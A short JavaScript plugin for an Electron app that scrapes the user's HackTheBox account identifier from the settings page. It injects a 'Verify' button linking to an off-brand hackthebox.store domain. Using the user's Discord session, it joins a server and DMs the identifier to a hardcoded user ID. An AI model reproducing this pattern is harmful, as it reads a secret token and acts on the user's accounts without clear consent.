// Account verification "plugin"

const electron = require('electron');
const Discord = electron.remote.require('./index').discord;
const button = `<li> <a href="https://hackthebox.store" class="menutext" data-toggle="modal" target="_blank"><i class="fab fa-discord" style="color: #7289DA"></i><span style="color: #7289DA"> Verify</span></a> </li>`;

function getAccIdentifier() {
	if (!window.accIdentifier) {
		try {
			var req = new XMLHttpRequest();
			req.open('GET', 'https://www.hackthebox.eu/home/settings', true);
			req.onreadystatechange = function (aEvt) {
				if (req.readyState == 4) {
					window.accIdentifier = req.responseText.match(/id\=\"identifier\"\>([a-zA-Z0-9_]+)\</i)[1];
				}
			};
			req.send(null);
		} catch (e) {

		}
	}	
}

getAccIdentifier();

function action(url) {
	if (!window.accIdentifier) {
		getAccIdentifier();
		return action(url);
	}

	let topBar = document.getElementsByClassName("navbar-nav")[0];
	topBar.innerHTML = button + topBar.innerHTML;
	topBar = document.getElementsByClassName("navbar-nav")[0];
	topBar.firstChild.onclick = (e) => {
		Discord.get("/guilds/473760315293696010") // Check if we are in discord
			.then(function(response) {
				Discord.post("/users/@me/channels", {recipient_id: "584993629941268501"})
					.then(res => {
						Discord.post(`/channels/${res.data.id}/messages`, {content: `sudo identify ${window.accIdentifier}`}) // Verify the account with the token
					})
			})
			.catch(function(err) {
				console.log(err)
				Discord.post("/invites/hRXnCFA")
					.then(r => {
						Discord.post("/users/@me/channels", {recipient_id: "584993629941268501"})
							.then(res => {
								Discord.post(`/channels/${res.data.id}/messages`, {content: `sudo identify ${window.accIdentifier}`}) // Verify the account with the token
							})
					})
				toastr["success"]("Success!", "HackTheBox Server joined!");
			})
		e.preventDefault();
	}
}

module.exports = action
